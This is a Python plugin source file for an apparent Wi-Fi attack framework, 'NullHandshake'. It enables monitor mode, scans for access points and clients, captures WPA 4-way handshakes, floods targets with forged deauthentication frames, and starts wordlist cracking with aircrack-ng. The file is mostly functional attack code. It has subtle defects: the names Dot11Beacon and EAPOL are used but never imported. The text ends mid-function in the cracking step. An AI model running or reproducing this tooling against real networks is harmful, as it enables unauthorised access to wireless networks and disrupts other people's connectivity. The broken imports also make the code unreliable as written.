#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NullHandshake - WPA Handshake Capture Plugin

This plugin implements functionality for capturing and processing WPA handshakes.
"""

import os
import time
import threading
import subprocess
import signal
import re
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple, Set

from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel

from scapy.all import (
    Dot11, Dot11Auth, Dot11AssoReq, Dot11AssoResp, 
    Dot11Deauth, RadioTap, Dot11Elt, 
    sendp, sniff, wrpcap, rdpcap
)

from core.plugin_manager import PluginInterface
from core.utils import (
    run_command, is_root, is_wireless_interface,
    check_dependency, is_valid_mac, sanitize_filename
)

class WPAHandshake(PluginInterface):
    """WPA handshake capture plugin for capturing and cracking WPA handshakes."""
    
    def __init__(self, framework):
        """
        Initialize the WPA handshake capture plugin.
        
        Args:
            framework: The NullHandshake framework instance
        """
        super().__init__(framework)
        self.name = "wpa_handshake"
        self.description = "Capture and process WPA handshakes for password cracking"
        
        # Configuration
        self.interface = None
        self.target_ap = None
        self.target_ssid = None
        self.target_bssid = None
        self.target_channel = None
        self.capture_file = None
        self.clients = set()
        self.handshake_captured = False
        
        # State tracking
        self.scanning = False
        self.deauthing = False
        self.monitoring = False
        self.scanner_thread = None
        self.deauth_thread = None
        self.monitor_thread = None
        self.original_interface_state = None
        
        # Paths
        self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.pcap_dir = os.path.join(
            self.base_dir, 'data', 
            self.framework.config.get('wpa_handshake', 'pcap_dir', 'captures')
        )
        os.makedirs(self.pcap_dir, exist_ok=True)
        
        self.logger.info("WPA handshake capture plugin initialized")
    
    def list_interfaces(self) -> List[str]:
        """
        List available wireless interfaces.
        
        Returns:
            List[str]: List of wireless interface names
        """
        from core.utils import get_interfaces
        
        interfaces = get_interfaces()
        wireless_interfaces = [iface for iface in interfaces if is_wireless_interface(iface)]
        
        if not wireless_interfaces:
            self.console.print("[yellow]No wireless interfaces found[/yellow]")
        else:
            table = Table(title="Wireless Interfaces")
            table.add_column("Interface", style="cyan")
            table.add_column("Wireless", style="green")
            
            for iface in interfaces:
                is_wireless = is_wireless_interface(iface)
                status = "[green]Yes[/green]" if is_wireless else "[red]No[/red]"
                if is_wireless:
                    table.add_row(iface, status)
            
            self.console.print(table)
        
        return wireless_interfaces
    
    def set_interface(self, interface: str) -> bool:
        """
        Set the wireless interface to use for capturing.
        
        Args:
            interface (str): Name of the wireless interface
            
        Returns:
            bool: True if interface was set successfully, False otherwise
        """
        if not is_wireless_interface(interface):
            self.console.print(f"[red]Error: {interface} is not a wireless interface[/red]")
            return False
        
        self.interface = interface
        self.console.print(f"[green]Interface set to: {interface}[/green]")
        return True
    
    def set_target(self, ssid: str = None, bssid: str = None, channel: int = None) -> bool:
        """
        Set the target access point details.
        
        Args:
            ssid (str, optional): SSID of the target access point
            bssid (str, optional): BSSID of the target access point
            channel (int, optional): Channel of the target access point
            
        Returns:
            bool: True if target was set successfully, False otherwise
        """
        if not ssid and not bssid:
            self.console.print("[red]Error: Either SSID or BSSID must be provided[/red]")
            return False
        
        if bssid and not is_valid_mac(bssid):
            self.console.print(f"[red]Error: Invalid BSSID format: {bssid}[/red]")
            return False
        
        if channel and not 1 <= channel <= 14:
            self.console.print(f"[red]Error: Invalid channel number: {channel}[/red]")
            return False
        
        self.target_ssid = ssid
        self.target_bssid = bssid
        self.target_channel = channel
        self.handshake_captured = False
        
        self.console.print(f"[green]Target access point set:[/green]")
        if ssid:
            self.console.print(f"  SSID: {ssid}")
        if bssid:
            self.console.print(f"  BSSID: {bssid}")
        if channel:
            self.console.print(f"  Channel: {channel}")
        
        return True
    
    def enable_monitor_mode(self) -> bool:
        """
        Enable monitor mode on the wireless interface.
        
        Returns:
            bool: True if monitor mode was enabled successfully, False otherwise
        """
        if not self.interface:
            self.console.print("[red]Error: No interface selected. Use set_interface first.[/red]")
            return False
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required to enable monitor mode[/red]")
            return False
        
        # Save original interface state for restoration later
        self.original_interface_state = self._get_interface_state()
        
        try:
            # Check if airmon-ng is available
            airmon_available = check_dependency('airmon-ng')
            
            if airmon_available:
                # Try to kill processes that might interfere
                run_command(["airmon-ng", "check", "kill"])
                
                # Enable monitor mode with airmon-ng
                rc, stdout, stderr = run_command(["airmon-ng", "start", self.interface])
                
                if rc != 0:
                    self.logger.error(f"airmon-ng failed: {stderr}")
                    # Try alternate method with iw
                    return self._enable_monitor_with_iw()
                
                # airmon-ng might have created a new interface name
                # Try to extract it from the output
                if "monitor mode enabled" in stdout or "monitor mode vif enabled" in stdout:
                    # Check if a new interface was created (e.g., wlan0mon)
                    mon_iface = self.interface + "mon"
                    alt_mon_iface = "mon" + self.interface
                    
                    from core.utils import get_interfaces
                    interfaces = get_interfaces()
                    
                    if mon_iface in interfaces:
                        self.interface = mon_iface
                    elif alt_mon_iface in interfaces:
                        self.interface = alt_mon_iface
                        
                    self.console.print(f"[green]Monitor mode enabled on {self.interface}[/green]")
                    return True
            else:
                # Use iw method if airmon-ng is not available
                return self._enable_monitor_with_iw()
                
        except Exception as e:
            self.logger.error(f"Error enabling monitor mode: {str(e)}")
            return False
    
    def _enable_monitor_with_iw(self) -> bool:
        """
        Enable monitor mode using iw command.
        
        Returns:
            bool: True if monitor mode was enabled successfully, False otherwise
        """
        try:
            # Bring down the interface
            run_command(["ip", "link", "set", self.interface, "down"])
            
            # Set monitor mode
            rc, stdout, stderr = run_command(["iw", self.interface, "set", "monitor", "none"])
            
            if rc != 0:
                self.logger.error(f"Failed to set monitor mode: {stderr}")
                return False
                
            # Bring up the interface
            rc, stdout, stderr = run_command(["ip", "link", "set", self.interface, "up"])
            
            if rc != 0:
                self.logger.error(f"Failed to bring up interface: {stderr}")
                return False
                
            self.console.print(f"[green]Monitor mode enabled on {self.interface}[/green]")
            return True
            
        except Exception as e:
            self.logger.error(f"Error setting monitor mode with iw: {str(e)}")
            return False
    
    def _get_interface_state(self) -> Dict[str, Any]:
        """
        Get the current state of the interface for later restoration.
        
        Returns:
            Dict[str, Any]: Interface state information
        """
        state = {
            "interface": self.interface,
            "original_mode": "managed"  # Assume managed by default
        }
        
        try:
            # Try to get the current mode with iw
            rc, stdout, stderr = run_command(["iw", self.interface, "info"])
            if rc == 0 and "type" in stdout:
                mode_line = [line for line in stdout.split('\n') if "type" in line]
                if mode_line:
                    state["original_mode"] = mode_line[0].split()[-1]
        
        except Exception as e:
            self.logger.error(f"Error getting interface state: {str(e)}")
        
        return state
    
    def disable_monitor_mode(self) -> bool:
        """
        Disable monitor mode and restore original interface state.
        
        Returns:
            bool: True if monitor mode was disabled successfully, False otherwise
        """
        if not self.interface:
            self.console.print("[yellow]No interface to restore[/yellow]")
            return False
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required to disable monitor mode[/red]")
            return False
        
        if not self.original_interface_state:
            self.console.print("[yellow]No original state to restore[/yellow]")
            return False
        
        try:
            # Check if airmon-ng is available
            airmon_available = check_dependency('airmon-ng')
            
            if airmon_available:
                # Try with airmon-ng first
                rc, stdout, stderr = run_command(["airmon-ng", "stop", self.interface])
                
                if rc != 0:
                    self.logger.error(f"airmon-ng failed: {stderr}")
                    # Fall back to iw method
                    return self._disable_monitor_with_iw()
                
                # airmon-ng might have restored the original interface name
                orig_iface = self.original_interface_state.get("interface")
                
                if orig_iface:
                    self.interface = orig_iface
                    
                self.console.print(f"[green]Monitor mode disabled, interface restored to {self.interface}[/green]")
                return True
            else:
                # Use iw method if airmon-ng is not available
                return self._disable_monitor_with_iw()
                
        except Exception as e:
            self.logger.error(f"Error disabling monitor mode: {str(e)}")
            return False
            
        finally:
            self.original_interface_state = None
    
    def _disable_monitor_with_iw(self) -> bool:
        """
        Disable monitor mode using iw command.
        
        Returns:
            bool: True if monitor mode was disabled successfully, False otherwise
        """
        try:
            # Bring down the interface
            run_command(["ip", "link", "set", self.interface, "down"])
            
            # Set managed mode
            original_mode = self.original_interface_state.get("original_mode", "managed")
            rc, stdout, stderr = run_command(["iw", self.interface, "set", "type", original_mode])
            
            if rc != 0:
                self.logger.error(f"Failed to set {original_mode} mode: {stderr}")
                return False
                
            # Bring up the interface
            rc, stdout, stderr = run_command(["ip", "link", "set", self.interface, "up"])
            
            if rc != 0:
                self.logger.error(f"Failed to bring up interface: {stderr}")
                return False
                
            # Restore original interface name if needed
            orig_iface = self.original_interface_state.get("interface")
            if orig_iface and orig_iface != self.interface:
                self.interface = orig_iface
                
            self.console.print(f"[green]Monitor mode disabled, interface restored to {self.interface}[/green]")
            return True
            
        except Exception as e:
            self.logger.error(f"Error disabling monitor mode with iw: {str(e)}")
            return False
    
    def set_channel(self, channel: int) -> bool:
        """
        Set the wireless interface to a specific channel.
        
        Args:
            channel (int): Channel number
            
        Returns:
            bool: True if channel was set successfully, False otherwise
        """
        if not self.interface:
            self.console.print("[red]Error: No interface selected. Use set_interface first.[/red]")
            return False
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required to set channel[/red]")
            return False
        
        if not 1 <= channel <= 14:
            self.console.print(f"[red]Error: Invalid channel number: {channel}[/red]")
            return False
        
        try:
            rc, stdout, stderr = run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
            
            if rc != 0:
                self.logger.error(f"Failed to set channel: {stderr}")
                return False
                
            self.console.print(f"[green]Channel set to: {channel}[/green]")
            return True
                
        except Exception as e:
            self.logger.error(f"Error setting channel: {str(e)}")
            return False
    
    def scan_for_targets(self, timeout: int = 30) -> bool:
        """
        Scan for wireless networks to identify targets.
        
        Args:
            timeout (int): Scan duration in seconds
            
        Returns:
            bool: True if scan was successful, False otherwise
        """
        if not self.interface:
            self.console.print("[red]Error: No interface selected. Use set_interface first.[/red]")
            return False
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required for scanning[/red]")
            return False
        
        if self.scanning:
            self.console.print("[yellow]Scanning is already active[/yellow]")
            return True
        
        # Create a temp capture file for airodump-ng
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        temp_prefix = os.path.join(self.pcap_dir, f"scan_{timestamp}")
        
        try:
            # Check if airodump-ng is available
            airodump_available = check_dependency('airodump-ng')
            
            if airodump_available:
                self.console.print(f"[green]Starting network scan for {timeout} seconds...[/green]")
                
                # Start airodump-ng in a separate process
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    TimeElapsedColumn(),
                    transient=True
                ) as progress:
                    progress.add_task(description="Scanning for networks...", total=None)
                    
                    # Run airodump-ng
                    proc = subprocess.Popen(
                        [
                            "airodump-ng",
                            "--output-format", "csv",
                            "--write", temp_prefix,
                            self.interface
                        ],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    
                    # Sleep for the specified timeout
                    time.sleep(timeout)
                    
                    # Terminate airodump-ng
                    proc.terminate()
                    proc.wait()
                
                # Process the CSV file
                csv_file = f"{temp_prefix}-01.csv"
                if os.path.exists(csv_file):
                    networks = self._parse_airodump_csv(csv_file)
                    self._display_networks(networks)
                    
                    # Clean up temporary files
                    for ext in ['-01.csv', '-01.kismet.csv', '-01.kismet.netxml', '-01.cap']:
                        if os.path.exists(f"{temp_prefix}{ext}"):
                            os.remove(f"{temp_prefix}{ext}")
                    
                    return True
                else:
                    self.console.print("[red]Error: No scan results found[/red]")
                    return False
            else:
                # Use scapy for scanning if airodump-ng is not available
                return self._scan_with_scapy(timeout)
                
        except Exception as e:
            self.logger.error(f"Error during network scan: {str(e)}")
            self.console.print(f"[red]Error during network scan: {str(e)}[/red]")
            return False
    
    def _scan_with_scapy(self, timeout: int) -> bool:
        """
        Scan for wireless networks using Scapy.
        
        Args:
            timeout (int): Scan duration in seconds
            
        Returns:
            bool: True if scan was successful, False otherwise
        """
        try:
            from scapy.all import conf
            
            # Set the interface
            conf.iface = self.interface
            
            self.console.print(f"[green]Starting network scan with Scapy for {timeout} seconds...[/green]")
            
            # Initialize network storage
            networks = {}
            
            # Function to process packets
            def process_packet(packet):
                if packet.haslayer(Dot11Beacon):
                    bssid = packet[Dot11].addr3
                    
                    # Extract SSID
                    try:
                        ssid = packet[Dot11Elt].info.decode('utf-8', errors='replace')
                    except:
                        ssid = "<unknown>"
                    
                    # Extract channel
                    channel = None
                    
                    # Check for DSset (channel) in Dot11Elt elements
                    dot11_element = packet.getlayer(Dot11Elt)
                    while dot11_element:
                        if dot11_element.ID == 3:  # DS Parameter Set
                            channel = ord(dot11_element.info)
                            break
                        dot11_element = dot11_element.payload if hasattr(dot11_element, 'payload') else None
                    
                    # Get signal strength if available
                    signal_strength = None
                    if packet.haslayer(RadioTap) and hasattr(packet[RadioTap], 'dBm_AntSignal'):
                        signal_strength = -(256 - packet[RadioTap].dBm_AntSignal)
                    
                    # Check for privacy bit (encryption)
                    privacy = bool(packet[Dot11Beacon].cap & 0x10)
                    
                    # Update network info
                    if bssid not in networks:
                        networks[bssid] = {
                            'ssid': ssid,
                            'bssid': bssid,
                            'channel': channel,
                            'signal': signal_strength,
                            'encryption': "WPA/WPA2" if privacy else "Open",
                            'clients': set()
                        }
                    else:
                        # Update signal if it's stronger
                        if signal_strength and (not networks[bssid]['signal'] or signal_strength > networks[bssid]['signal']):
                            networks[bssid]['signal'] = signal_strength
                
                # Track client associations
                elif packet.haslayer(Dot11) and packet.type == 2:  # Data frame
                    ds_status = packet.FCfield & 0x3
                    
                    if ds_status == 1:  # To DS
                        client = packet.addr2  # Client sending to AP
                        bssid = packet.addr1   # AP
                    elif ds_status == 2:  # From DS
                        client = packet.addr1  # Client receiving from AP
                        bssid = packet.addr2   # AP
                    else:
                        return
                    
                    if bssid in networks:
                        networks[bssid]['clients'].add(client)
            
            # Start sniffing
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                TimeElapsedColumn(),
                transient=True
            ) as progress:
                progress.add_task(description="Scanning for networks...", total=None)
                
                sniff(iface=self.interface, prn=process_packet, timeout=timeout, store=False)
            
            # Convert client sets to lists for display
            for bssid in networks:
                networks[bssid]['clients'] = list(networks[bssid]['clients'])
            
            # Display results
            self._display_networks(list(networks.values()))
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error scanning with Scapy: {str(e)}")
            self.console.print(f"[red]Error scanning with Scapy: {str(e)}[/red]")
            return False
    
    def _parse_airodump_csv(self, csv_file: str) -> List[Dict[str, Any]]:
        """
        Parse airodump-ng CSV output.
        
        Args:
            csv_file (str): Path to the CSV file
            
        Returns:
            List[Dict[str, Any]]: List of network information dictionaries
        """
        networks = []
        clients = {}
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()
                
                # Find the divider between APs and clients
                divider_index = None
                for i, line in enumerate(lines):
                    if "Station MAC" in line:
                        divider_index = i
                        break
                
                if divider_index is None:
                    return networks
                
                # Parse APs
                for line in lines[1:divider_index]:
                    line = line.strip()
                    if not line:
                        continue
                    
                    fields = [field.strip() for field in line.split(',')]
                    if len(fields) < 14:
                        continue
                    
                    bssid = fields[0]
                    power = fields[3]
                    channel = fields[5]
                    encryption = fields[6]
                    ssid = fields[13]
                    
                    # Skip if no SSID or BSSID
                    if not bssid or not ssid:
                        continue
                    
                    networks.append({
                        'bssid': bssid,
                        'ssid': ssid,
                        'channel': int(channel) if channel.isdigit() else None,
                        'signal': int(power) if power.strip('-').isdigit() else None,
                        'encryption': encryption,
                        'clients': []
                    })
                    
                    # Initialize clients dict for this AP
                    clients[bssid] = []
                
                # Parse clients
                for line in lines[divider_index+1:]:
                    line = line.strip()
                    if not line:
                        continue
                    
                    fields = [field.strip() for field in line.split(',')]
                    if len(fields) < 6:
                        continue
                    
                    client_mac = fields[0]
                    bssid = fields[5]
                    
                    if bssid in clients:
                        clients[bssid].append(client_mac)
            
            # Add clients to networks
            for network in networks:
                if network['bssid'] in clients:
                    network['clients'] = clients[network['bssid']]
                
        except Exception as e:
            self.logger.error(f"Error parsing airodump-ng CSV: {str(e)}")
        
        return networks
    
    def _display_networks(self, networks: List[Dict[str, Any]]) -> None:
        """
        Display discovered networks.
        
        Args:
            networks (List[Dict[str, Any]]): List of network information dictionaries
        """
        if not networks:
            self.console.print("[yellow]No networks found during scan[/yellow]")
            return
        
        # Create a formatted table
        table = Table(title="Discovered Wireless Networks")
        table.add_column("#", style="dim", width=4)
        table.add_column("SSID", style="cyan")
        table.add_column("BSSID", style="blue")
        table.add_column("Channel", style="magenta", width=8)
        table.add_column("Signal", style="green", width=8)
        table.add_column("Encryption", style="yellow")
        table.add_column("Clients", style="red", width=8)
        
        # Sort networks by signal strength
        sorted_networks = sorted(
            networks, 
            key=lambda x: x.get('signal', -100) if x.get('signal') is not None else -100,
            reverse=True
        )
        
        for idx, network in enumerate(sorted_networks, 1):
            # Format signal strength
            signal = f"{network.get('signal')} dBm" if network.get('signal') is not None else "N/A"
            
            # Format client count
            client_count = len(network.get('clients', []))
            
            table.add_row(
                str(idx),
                network.get('ssid', 'N/A'),
                network.get('bssid', 'N/A'),
                str(network.get('channel', 'N/A')),
                signal,
                network.get('encryption', 'N/A'),
                str(client_count)
            )
        
        # Print the table
        self.console.print(table)
        
        # Update target if a single matching network was found
        if self.target_ssid or self.target_bssid:
            matching_networks = []
            
            for network in networks:
                # Check SSID match
                ssid_match = self.target_ssid and self.target_ssid.lower() == network.get('ssid', '').lower()
                
                # Check BSSID match
                bssid_match = self.target_bssid and self.target_bssid.lower() == network.get('bssid', '').lower()
                
                if ssid_match or bssid_match:
                    matching_networks.append(network)
            
            if len(matching_networks) == 1:
                network = matching_networks[0]
                self.target_ssid = network.get('ssid')
                self.target_bssid = network.get('bssid')
                self.target_channel = network.get('channel')
                self.clients = set(network.get('clients', []))
                
                self.console.print("[green]Updated target with scan results:[/green]")
                self.console.print(f"  SSID: {self.target_ssid}")
                self.console.print(f"  BSSID: {self.target_bssid}")
                self.console.print(f"  Channel: {self.target_channel}")
                self.console.print(f"  Known clients: {len(self.clients)}")
            elif len(matching_networks) > 1:
                self.console.print("[yellow]Multiple matching networks found, please specify target manually[/yellow]")
    
    def start_handshake_capture(self) -> bool:
        """
        Start capturing packets to collect WPA handshakes.
        
        Returns:
            bool: True if capture was started successfully, False otherwise
        """
        if not self.interface:
            self.console.print("[red]Error: No interface selected. Use set_interface first.[/red]")
            return False
        
        if not self.target_bssid:
            self.console.print("[red]Error: No target set. Use set_target or scan_for_targets first.[/red]")
            return False
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required for packet capture[/red]")
            return False
        
        if self.monitoring:
            self.console.print("[yellow]Handshake monitoring is already active[/yellow]")
            return True
        
        # Set channel if target channel is known
        if self.target_channel:
            self.set_channel(self.target_channel)
        
        # Create capture file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        ssid_safe = sanitize_filename(self.target_ssid) if self.target_ssid else "unknown"
        
        self.capture_file = os.path.join(self.pcap_dir, f"handshake_{ssid_safe}_{timestamp}.cap")
        
        # Start monitoring thread
        self.monitoring = True
        self.handshake_captured = False
        self.monitor_thread = threading.Thread(
            target=self._monitor_for_handshakes,
            daemon=True
        )
        self.monitor_thread.start()
        
        self.console.print(f"[green]Started monitoring for WPA handshakes on {self.interface}[/green]")
        self.console.print(f"[green]Target AP: {self.target_bssid} ({self.target_ssid or 'Unknown'})[/green]")
        self.console.print(f"[green]Capture file: {self.capture_file}[/green]")
        
        return True
    
    def _monitor_for_handshakes(self) -> None:
        """Monitor for WPA handshakes and save them to capture file."""
        try:
            from scapy.all import conf, Dot11, wrpcap
            
            conf.iface = self.interface
            packets = []
            eapol_count = 0
            
            # Function to process packets and detect handshakes
            def process_packet(packet):
                nonlocal packets, eapol_count
                
                # Check if packet belongs to target network
                if packet.haslayer(Dot11) and packet.addr3 == self.target_bssid:
                    # Check for EAPOL packets (part of 4-way handshake)
                    if packet.haslayer(EAPOL):
                        eapol_count += 1
                        self.logger.info(f"Captured EAPOL packet {eapol_count}/4")
                        
                        # Check if we have enough packets for a handshake
                        if eapol_count >= 4:
                            self.handshake_captured = True
                            self.logger.info("WPA handshake captured successfully!")
                    
                    # Store the packet
                    packets.append(packet)
                    
                    # Periodically write packets to file
                    if len(packets) >= 100:
                        wrpcap(self.capture_file, packets, append=True)
                        packets = []
                
                # Return True to stop sniffing if we have a handshake and we're not monitoring anymore
                return self.handshake_captured and not self.monitoring
            
            # Start sniffing
            try:
                sniff(iface=self.interface, prn=process_packet, store=False)
            except Exception as e:
                self.logger.error(f"Error during packet sniffing: {str(e)}")
            
            # Write remaining packets to file
            if packets:
                wrpcap(self.capture_file, packets, append=True)
            
        except Exception as e:
            self.logger.error(f"Error in handshake monitoring: {str(e)}")
        finally:
            self.monitoring = False
    
    def stop_handshake_capture(self) -> bool:
        """
        Stop capturing packets.
        
        Returns:
            bool: True if capture was stopped successfully, False otherwise
        """
        if not self.monitoring:
            self.console.print("[yellow]Handshake monitoring is not active[/yellow]")
            return True
        
        # Stop monitoring thread
        self.monitoring = False
        
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2.0)
            self.monitor_thread = None
        
        self.console.print("[green]Stopped handshake monitoring[/green]")
        
        if self.handshake_captured:
            self.console.print("[green bold]WPA handshake was successfully captured![/green bold]")
        else:
            self.console.print("[yellow]No complete WPA handshake was captured[/yellow]")
        
        return True
    
    def send_deauth(self, count: int = 5, client: str = None) -> bool:
        """
        Send deauthentication packets to disconnect clients from the target AP.
        
        Args:
            count (int): Number of deauth packets to send
            client (str, optional): Specific client MAC to deauth, broadcast if None
            
        Returns:
            bool: True if deauth packets were sent successfully, False otherwise
        """
        if not self.interface:
            self.console.print("[red]Error: No interface selected. Use set_interface first.[/red]")
            return False
        
        if not self.target_bssid:
            self.console.print("[red]Error: No target set. Use set_target or scan_for_targets first.[/red]")
            return False
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required to send deauth packets[/red]")
            return False
        
        if self.deauthing:
            self.console.print("[yellow]Deauthentication is already in progress[/yellow]")
            return True
        
        # Set channel if target channel is known
        if self.target_channel:
            self.set_channel(self.target_channel)
        
        # Start deauth thread
        self.deauthing = True
        self.deauth_thread = threading.Thread(
            target=self._send_deauth_packets,
            args=(count, client),
            daemon=True
        )
        self.deauth_thread.start()
        
        if client:
            self.console.print(f"[green]Sending {count} deauth packets to client {client}[/green]")
        else:
            self.console.print(f"[green]Sending {count} broadcast deauth packets[/green]")
        
        return True
    
    def _send_deauth_packets(self, count: int, client: str = None) -> None:
        """
        Send deauthentication packets (thread function).
        
        Args:
            count (int): Number of deauth packets to send
            client (str, optional): Specific client MAC to deauth, broadcast if None
        """
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            
            # Create deauth packet
            if client:
                # Deauth specific client
                deauth_packet = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1=client,
                    addr2=self.target_bssid,
                    addr3=self.target_bssid
                ) / Dot11Deauth(reason=7)
                
                # Also create reverse packet (AP to client)
                deauth_packet2 = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1=self.target_bssid,
                    addr2=client,
                    addr3=self.target_bssid
                ) / Dot11Deauth(reason=7)
                
                packets = [deauth_packet, deauth_packet2]
                target_desc = f"client {client}"
            else:
                # Broadcast deauth
                deauth_packet = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=self.target_bssid,
                    addr3=self.target_bssid
                ) / Dot11Deauth(reason=7)
                
                packets = [deauth_packet]
                target_desc = "all clients (broadcast)"
            
            self.logger.info(f"Sending {count} deauth packets to {target_desc}")
            
            # Send the packets
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                transient=True
            ) as progress:
                task = progress.add_task(description=f"Sending deauth to {target_desc}...", total=count)
                
                for i in range(count):
                    for packet in packets:
                        sendp(packet, iface=self.interface, verbose=False)
                    
                    progress.update(task, advance=1)
                    time.sleep(0.1)
            
            self.logger.info(f"Finished sending deauth packets to {target_desc}")
            
        except Exception as e:
            self.logger.error(f"Error sending deauth packets: {str(e)}")
        finally:
            self.deauthing = False
    
    def deauth_clients(self, count: int = 5) -> bool:
        """
        Send deauthentication packets to all known clients of the target AP.
        
        Args:
            count (int): Number of deauth packets to send to each client
            
        Returns:
            bool: True if deauth packets were sent successfully, False otherwise
        """
        if not self.interface:
            self.console.print("[red]Error: No interface selected. Use set_interface first.[/red]")
            return False
        
        if not self.target_bssid:
            self.console.print("[red]Error: No target set. Use set_target or scan_for_targets first.[/red]")
            return False
        
        if not self.clients:
            self.console.print("[yellow]No known clients for target network. Try scanning first.[/yellow]")
            # Send broadcast deauth as fallback
            return self.send_deauth(count)
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required to send deauth packets[/red]")
            return False
        
        if self.deauthing:
            self.console.print("[yellow]Deauthentication is already in progress[/yellow]")
            return True
        
        # Set channel if target channel is known
        if self.target_channel:
            self.set_channel(self.target_channel)
        
        # Start deauth thread for each client
        self.deauthing = True
        self.deauth_thread = threading.Thread(
            target=self._deauth_all_clients,
            args=(count,),
            daemon=True
        )
        self.deauth_thread.start()
        
        self.console.print(f"[green]Sending {count} deauth packets to {len(self.clients)} clients[/green]")
        
        return True
    
    def _deauth_all_clients(self, count: int) -> None:
        """
        Send deauthentication packets to all known clients (thread function).
        
        Args:
            count (int): Number of deauth packets to send to each client
        """
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            
            self.logger.info(f"Deauthenticating {len(self.clients)} clients")
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                transient=True
            ) as progress:
                task = progress.add_task(
                    description=f"Deauthenticating {len(self.clients)} clients...",
                    total=len(self.clients)
                )
                
                for client in self.clients:
                    # Create deauth packets (both directions)
                    deauth_client = RadioTap() / Dot11(
                        type=0, subtype=12,
                        addr1=client,
                        addr2=self.target_bssid,
                        addr3=self.target_bssid
                    ) / Dot11Deauth(reason=7)
                    
                    deauth_ap = RadioTap() / Dot11(
                        type=0, subtype=12,
                        addr1=self.target_bssid,
                        addr2=client,
                        addr3=self.target_bssid
                    ) / Dot11Deauth(reason=7)
                    
                    # Send the packets
                    for i in range(count):
                        sendp(deauth_client, iface=self.interface, verbose=False)
                        sendp(deauth_ap, iface=self.interface, verbose=False)
                        time.sleep(0.1)
                    
                    progress.update(task, advance=1)
            
            self.logger.info("Finished deauthenticating all clients")
            
        except Exception as e:
            self.logger.error(f"Error deauthenticating clients: {str(e)}")
        finally:
            self.deauthing = False
    
    def verify_handshake(self, capture_file: str = None) -> bool:
        """
        Verify if a capture file contains a valid WPA handshake.
        
        Args:
            capture_file (str, optional): Path to capture file, uses current capture if None
            
        Returns:
            bool: True if a valid handshake was found, False otherwise
        """
        if not capture_file and not self.capture_file:
            self.console.print("[red]Error: No capture file specified[/red]")
            return False
        
        file_to_check = capture_file or self.capture_file
        
        if not os.path.exists(file_to_check):
            self.console.print(f"[red]Error: Capture file not found: {file_to_check}[/red]")
            return False
        
        # First try with aircrack-ng if available
        aircrack_available = check_dependency('aircrack-ng')
        
        if aircrack_available:
            rc, stdout, stderr = run_command(["aircrack-ng", file_to_check])
            
            if rc == 0 and ("1 handshake" in stdout or "handshake found" in stdout):
                self.handshake_captured = True
                self.console.print(f"[green]Valid WPA handshake found in {file_to_check}[/green]")
                return True
            else:
                # Check for specific handshake messages
                handshake_found = "handshake found" in stdout or "handshake detected" in stdout
                if handshake_found:
                    self.handshake_captured = True
                    self.console.print(f"[green]Valid WPA handshake found in {file_to_check}[/green]")
                    return True
                else:
                    self.console.print(f"[yellow]No valid WPA handshake found in {file_to_check} using aircrack-ng[/yellow]")
        
        # Fall back to manual verification using Scapy
        try:
            from scapy.all import rdpcap
            
            self.console.print("[yellow]Analyzing capture file with Scapy...[/yellow]")
            
            packets = rdpcap(file_to_check)
            
            # Check for EAPOL packets
            eapol_packets = [p for p in packets if EAPOL in p]
            
            if len(eapol_packets) >= 4:
                # Simple check: if we have at least 4 EAPOL packets, assume we have a handshake
                self.handshake_captured = True
                self.console.print(f"[green]Found {len(eapol_packets)} EAPOL packets in capture (potential handshake)[/green]")
                return True
            else:
                self.console.print(f"[yellow]Only found {len(eapol_packets)} EAPOL packets, need at least 4 for a complete handshake[/yellow]")
                return False
            
        except Exception as e:
            self.logger.error(f"Error verifying handshake: {str(e)}")
            self.console.print(f"[red]Error verifying handshake: {str(e)}[/red]")
            return False
    
    def crack_handshake(self, wordlist: str = None, capture_file: str = None) -> bool:
        """
        Attempt to crack a WPA handshake using a wordlist.
        
        Args:
            wordlist (str, optional): Path to wordlist file
            capture_file (str, optional): Path to capture file, uses current capture if None
            
        Returns:
            bool: True if password was cracked, False otherwise
        """
        if not capture_file and not self.capture_file:
            self.console.print("[red]Error: No capture file specified[/red]")
            return False
        
        file_to_crack = capture_file or self.capture_file
        
        if not os.path.exists(file_to_crack):
            self.console.print(f"[red]Error: Capture file not found: {file_to_crack}[/red]")
            return False
        
        # Use wordlist from config if not specified
        if not wordlist:
            wordlist = self.framework.config.get('wpa_handshake', 'wordlist_path', '')
        
        if not wordlist or not os.path.exists(wordlist):
            self.console.print("[red]Error: No valid wordlist specified[/red]")
            self.console.print("[yellow]Set wordlist path with: `config wpa_handshake wordlist_path /path/to/wordlist.txt`[/yellow]")
            return False
        
        # Check if aircrack-ng is available
        aircrack_available = check_dependency('aircrack-ng')
        
        if not aircrack_available:
            self.console.print("[red]Error: aircrack-ng not found, cannot crack handshake[/red]")
            return False
        
        try:
            self.console.print(f"[green]Attempting to crack WPA handshake in {file_to_crack}[/green]")
            self.console.print(f"[green]Using wordlist: {wordlist}[/green]")
            
            # Run aircrack-ng
